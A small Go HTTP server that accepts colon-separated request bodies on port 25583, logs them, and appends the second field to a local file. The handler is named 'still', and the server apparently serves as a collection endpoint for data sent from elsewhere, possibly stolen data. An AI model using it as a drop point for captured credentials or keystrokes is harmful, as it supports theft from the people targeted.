package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

var file, _ = os.OpenFile("file.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

func writeToFile(st string) {
	_, err := file.WriteString(st)
	if err != nil {
		log.Fatal(err)
	}
}

func still(w http.ResponseWriter, r *http.Request) {
	save, err := io.ReadAll(r.Body)
	if err != nil {
		log.Fatal(err)
	}
	st := string(save)

	splitArray := strings.Split(st, ":")
	if len(splitArray) != 2 {
		log.Fatal("Invalid data")
	}

	log.Print(splitArray[0] + ": " + splitArray[1])

	if splitArray[1] == "favicon.ico" {
		return
	}

	writeToFile(splitArray[1])
}

func main() {
	defer file.Close()

	http.HandleFunc("/", still)
	http.ListenAndServe(":25583", nil)
}
